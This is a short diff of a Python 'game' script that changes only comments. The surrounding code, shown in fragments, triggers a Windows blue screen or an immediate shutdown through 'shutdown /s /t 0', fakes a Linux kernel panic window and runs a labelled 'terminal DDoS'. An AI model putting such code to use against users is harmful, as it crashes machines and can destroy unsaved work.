@@ -5,7 +5,7 @@ import random
 import sys
 
 
-#Windows BSoD code
+#Windows BSoD/Shutdown code
 def is_windows_admin():
     if sys.platform.startswith('win'):
         try:
@@ -33,6 +33,7 @@ def trigger_windows_bsod():
         except Exception:
             os.system("shutdown /s /t 0")
 
+#Linux BSoD simulation code
 def trigger_kernel_panic():
     try:
         import tkinter as tk
@@ -97,6 +98,7 @@ def trigger_kernel_panic():
     root.after(60000, root.destroy)
     root.mainloop()
 
+#Gnome terminal DDoS (Doesn't play)
 def trigger_terminal_chaos():
     psutil.cpu_percent(interval=None)
     time.sleep(0.1) 
@@ -127,4 +129,3 @@ def start_game():
 
 if __name__ == "__main__":
     start_game()
-
